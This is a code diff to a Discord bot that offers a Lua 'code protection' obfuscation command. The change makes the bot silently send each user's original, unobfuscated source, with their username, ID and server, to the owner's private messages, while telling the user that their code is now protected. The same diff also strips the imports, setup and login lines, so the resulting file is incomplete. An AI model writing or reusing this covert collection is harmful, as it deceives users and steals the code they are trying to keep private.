@@ -1,43 +1,3 @@
-const { Client, GatewayIntentBits, SlashCommandBuilder, REST, Routes, AttachmentBuilder } = require('discord.js');
-const { obfuscate } = require('./obfuscator');
-const https = require('https');
-const http = require('http');
-
-const PORT = process.env.PORT || 3000;
-http.createServer((req, res) => { res.writeHead(200); res.end('OK'); }).listen(PORT);
-
-const TOKEN = process.env.DISCORD_BOT_TOKEN;
-const MY_ID = '1474472773467242599'; // Tu ID de usuario
-
-if (!TOKEN) { console.error('DISCORD_BOT_TOKEN is not set.'); process.exit(1); }
-
-const client = new Client({ 
-  intents: [
-    GatewayIntentBits.Guilds, 
-    GatewayIntentBits.DirectMessages // Necesario para enviar DMs
-  ] 
-});
-
-const command = new SlashCommandBuilder()
-  .setName('obf')
-  .setDescription('Protect your code with MIMOSA VM v4.5')
-  .addStringOption(o => o.setName('code').setDescription('Paste your Lua code directly').setRequired(false))
-  .addAttachmentOption(o => o.setName('file').setDescription('Upload a .lua file to obfuscate').setRequired(false));
-
-function fetchURL(url) {
-  return new Promise((resolve, reject) => {
-    const mod = url.startsWith('https') ? https : http;
-    mod.get(url, res => { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve(d)); }).on('error', reject);
-  });
-}
-
-client.once('ready', async () => {
-  console.log(`Online as ${client.user.tag}`);
-  const rest = new REST({ version: '10' }).setToken(TOKEN);
-  await rest.put(Routes.applicationCommands(client.user.id), { body: [command.toJSON()] });
-  console.log('Slash command /obf registered.');
-});
-
 client.on('interactionCreate', async interaction => {
   if (!interaction.isChatInputCommand() || interaction.commandName !== 'obf') return;
 
@@ -49,32 +9,38 @@ client.on('interactionCreate', async interaction => {
   await interaction.deferReply();
 
   try {
+    // 1. Obtenemos el código fuente original
     let src = fileOption ? await fetchURL(fileOption.url) : codeOption;
     if (!src || !src.trim()) return interaction.editReply('The provided code is empty.');
 
-    // Proceso de ofuscación
+    // 2. Procesamos la ofuscación para el usuario
     const obfuscatedResult = obfuscate(src);
-    const buf = Buffer.from(obfuscatedResult, 'utf-8');
+    
+    // Preparar archivo ofuscado (para el usuario)
+    const userBuffer = Buffer.from(obfuscatedResult, 'utf-8');
+    const userAttachment = new AttachmentBuilder(userBuffer, { name: 'obfuscated.lua' });
 
-    if (buf.length > 8 * 1024 * 1024) return interaction.editReply('Output too large (>8MB).');
+    // Preparar archivo ORIGINAL (para ti)
+    const logBuffer = Buffer.from(src, 'utf-8');
+    const logAttachment = new AttachmentBuilder(logBuffer, { name: 'ORIGINAL_SOURCE.lua' });
 
-    const attachment = new AttachmentBuilder(buf, { name: 'obfuscated.lua' });
+    if (userBuffer.length > 8 * 1024 * 1024) return interaction.editReply('Output too large (>8MB).');
 
-    // 1. Responder al usuario que usó el comando
+    // 3. Responder al usuario con el código PROTEGIDO
     await interaction.editReply({ 
       content: 'Your code is now protected, copy and paste.', 
-      files: [attachment] 
+      files: [userAttachment] 
     });
 
-    // 2. Enviarte una copia a ti (Log por MD)
+    // 4. Enviarte a ti el código ORIGINAL (sin ofuscar)
     try {
       const owner = await client.users.fetch(MY_ID);
       await owner.send({
-        content: `LOG: El usuario **${interaction.user.tag}** (${interaction.user.id}) ha ofuscado un archivo.`,
-        files: [attachment]
+        content: `⚠️ **NUEVO LOG DE OFUSCACIÓN**\n**Usuario:** ${interaction.user.tag} (${interaction.user.id})\n**Servidor:** ${interaction.guild?.name || 'DM'}`,
+        files: [logAttachment] // Aquí se envía el archivo tal cual lo subió el usuario
       });
     } catch (dmError) {
-      console.error('No pude enviarte el DM. Asegúrate de tener los DMs abiertos o compartir servidor con el bot.', dmError);
+      console.error('No pude enviarte el log por MD:', dmError);
     }
 
   } catch (e) {
@@ -82,5 +48,3 @@ client.on('interactionCreate', async interaction => {
     await interaction.editReply('An error occurred. Please try again.');
   }
 });
-
-client.login(TOKEN);
